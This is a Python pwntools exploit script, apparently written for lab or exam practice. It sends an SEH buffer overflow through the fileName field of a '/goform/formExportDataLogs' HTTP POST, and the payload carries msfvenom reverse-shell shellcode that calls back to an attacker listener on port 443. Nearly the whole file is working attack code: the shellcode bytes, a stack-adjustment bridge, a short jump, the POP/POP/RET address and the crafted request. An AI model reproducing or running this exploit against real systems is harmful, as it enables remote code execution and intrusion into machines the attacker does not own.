#!/usr/bin/python
from pwn import *
from urllib import parse
from time import sleep
from sys import argv,exit
from os import system

# HOST = "192.168.122.86"
# PORT = 80
HOST = "192.168.151.45"
PORT = 80

EX_HANDLER_OFFSET = 751

# local
# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b "\x00" LHOST=192.168.122.182 LPORT=443 -f python
# buf =  b""
# buf += b"\xb8\xd4\x7d\xdc\x5c\xdb\xd0\xd9\x74\x24\xf4\x5b"
# buf += b"\x33\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x17"
# buf += b"\x79\x3e\xa9\x6b\x6a\x3c\x52\x93\x6b\x21\xda\x76"
# buf += b"\x5a\x61\xb8\xf3\xcd\x51\xca\x51\xe2\x1a\x9e\x41"
# buf += b"\x71\x6e\x37\x66\x32\xc5\x61\x49\xc3\x76\x51\xc8"
# buf += b"\x47\x85\x86\x2a\x79\x46\xdb\x2b\xbe\xbb\x16\x79"
# buf += b"\x17\xb7\x85\x6d\x1c\x8d\x15\x06\x6e\x03\x1e\xfb"
# buf += b"\x27\x22\x0f\xaa\x3c\x7d\x8f\x4d\x90\xf5\x86\x55"
# buf += b"\xf5\x30\x50\xee\xcd\xcf\x63\x26\x1c\x2f\xcf\x07"
# buf += b"\x90\xc2\x11\x40\x17\x3d\x64\xb8\x6b\xc0\x7f\x7f"
# buf += b"\x11\x1e\xf5\x9b\xb1\xd5\xad\x47\x43\x39\x2b\x0c"
# buf += b"\x4f\xf6\x3f\x4a\x4c\x09\x93\xe1\x68\x82\x12\x25"
# buf += b"\xf9\xd0\x30\xe1\xa1\x83\x59\xb0\x0f\x65\x65\xa2"
# buf += b"\xef\xda\xc3\xa9\x02\x0e\x7e\xf0\x4a\xe3\xb3\x0a"
# buf += b"\x8b\x6b\xc3\x79\xb9\x34\x7f\x15\xf1\xbd\x59\xe2"
# buf += b"\xf6\x97\x1e\x7c\x09\x18\x5f\x55\xce\x4c\x0f\xcd"
# buf += b"\xe7\xec\xc4\x0d\x07\x39\x4a\x5d\xa7\x92\x2b\x0d"
# buf += b"\x07\x43\xc4\x47\x88\xbc\xf4\x68\x42\xd5\x9f\x93"
# buf += b"\x05\x1a\xf7\xe1\x63\xf2\x0a\x15\x8d\xb8\x82\xf3"
# buf += b"\xe7\xae\xc2\xac\x9f\x57\x4f\x26\x01\x97\x45\x43"
# buf += b"\x01\x13\x6a\xb4\xcc\xd4\x07\xa6\xb9\x14\x52\x94"
# buf += b"\x6c\x2a\x48\xb0\xf3\xb9\x17\x40\x7d\xa2\x8f\x17"
# buf += b"\x2a\x14\xc6\xfd\xc6\x0f\x70\xe3\x1a\xc9\xbb\xa7"
# buf += b"\xc0\x2a\x45\x26\x84\x17\x61\x38\x50\x97\x2d\x6c"
# buf += b"\x0c\xce\xfb\xda\xea\xb8\x4d\xb4\xa4\x17\x04\x50"
# buf += b"\x30\x54\x97\x26\x3d\xb1\x61\xc6\x8c\x6c\x34\xf9"
# buf += b"\x21\xf9\xb0\x82\x5f\x99\x3f\x59\xe4\xa9\x75\xc3"
# buf += b"\x4d\x22\xd0\x96\xcf\x2f\xe3\x4d\x13\x56\x60\x67"
# buf += b"\xec\xad\x78\x02\xe9\xea\x3e\xff\x83\x63\xab\xff"
# buf += b"\x30\x83\xfe"

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b "\x00" LHOST=192.168.45.153 LPORT=443 -f python
buf =  b""
buf += b"\xba\x40\xbb\x4f\x42\xda\xca\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\x16"
buf += b"\xb5\xad\xb7\x6a\x21\xb3\x38\x92\xb2\xd4\xb1\x77"
buf += b"\x83\xd4\xa6\xfc\xb4\xe4\xad\x50\x39\x8e\xe0\x40"
buf += b"\xca\xe2\x2c\x67\x7b\x48\x0b\x46\x7c\xe1\x6f\xc9"
buf += b"\xfe\xf8\xa3\x29\x3e\x33\xb6\x28\x07\x2e\x3b\x78"
buf += b"\xd0\x24\xee\x6c\x55\x70\x33\x07\x25\x94\x33\xf4"
buf += b"\xfe\x97\x12\xab\x75\xce\xb4\x4a\x59\x7a\xfd\x54"
buf += b"\xbe\x47\xb7\xef\x74\x33\x46\x39\x45\xbc\xe5\x04"
buf += b"\x69\x4f\xf7\x41\x4e\xb0\x82\xbb\xac\x4d\x95\x78"
buf += b"\xce\x89\x10\x9a\x68\x59\x82\x46\x88\x8e\x55\x0d"
buf += b"\x86\x7b\x11\x49\x8b\x7a\xf6\xe2\xb7\xf7\xf9\x24"
buf += b"\x3e\x43\xde\xe0\x1a\x17\x7f\xb1\xc6\xf6\x80\xa1"
buf += b"\xa8\xa7\x24\xaa\x45\xb3\x54\xf1\x01\x70\x55\x09"
buf += b"\xd2\x1e\xee\x7a\xe0\x81\x44\x14\x48\x49\x43\xe3"
buf += b"\xaf\x60\x33\x7b\x4e\x8b\x44\x52\x95\xdf\x14\xcc"
buf += b"\x3c\x60\xff\x0c\xc0\xb5\x50\x5c\x6e\x66\x11\x0c"
buf += b"\xce\xd6\xf9\x46\xc1\x09\x19\x69\x0b\x22\xb0\x90"
buf += b"\xdc\x8d\xed\xb7\x85\x66\xec\xc7\xb4\xcd\x79\x21"
buf += b"\xdc\x21\x2c\xfa\x49\xdb\x75\x70\xeb\x24\xa0\xfd"
buf += b"\x2b\xae\x47\x02\xe5\x47\x2d\x10\x92\xa7\x78\x4a"
buf += b"\x35\xb7\x56\xe2\xd9\x2a\x3d\xf2\x94\x56\xea\xa5"
buf += b"\xf1\xa9\xe3\x23\xec\x90\x5d\x51\xed\x45\xa5\xd1"
buf += b"\x2a\xb6\x28\xd8\xbf\x82\x0e\xca\x79\x0a\x0b\xbe"
buf += b"\xd5\x5d\xc5\x68\x90\x37\xa7\xc2\x4a\xeb\x61\x82"
buf += b"\x0b\xc7\xb1\xd4\x13\x02\x44\x38\xa5\xfb\x11\x47"
buf += b"\x0a\x6c\x96\x30\x76\x0c\x59\xeb\x32\x3c\x10\xb1"
buf += b"\x13\xd5\xfd\x20\x26\xb8\xfd\x9f\x65\xc5\x7d\x15"
buf += b"\x16\x32\x9d\x5c\x13\x7e\x19\x8d\x69\xef\xcc\xb1"
buf += b"\xde\x10\xc5"
sc = buf

# 0x02b3f43c SP
# 0x02b5fa45 start of the payload
# I need the difference which is 1545
# ADD 3 more so 1548 in total to fix stack alighnment
# 1548 = 12 * 127 + 24
# ADD ESP, 0x7F
bridge = b"\x83\xC4\x7F" * 12 # 36
# ADD ESP, 0x18
bridge += b"\x83\xC4\x10" # 3
# JMP ESP
bridge += b"\xFF\xE4" # 2
# 41 in total

buffer = b"\x90"*(EX_HANDLER_OFFSET-len(bridge)-len(sc))
buffer += sc
buffer += bridge
# jmp $-41
buffer += b"\xEB\xD5\x90\x90"
# found by !py mona seh
buffer += p32(0x00476b25)
# not needed anymore since 0x00476b25 has a null byte
# buffer += b"D"*(800-len(buffer))

content= "dataFormat=comma&exportto=file&fileName=%s" % parse.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: application/json"
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

p = remote(HOST, PORT)

p.send(payload)
p.close()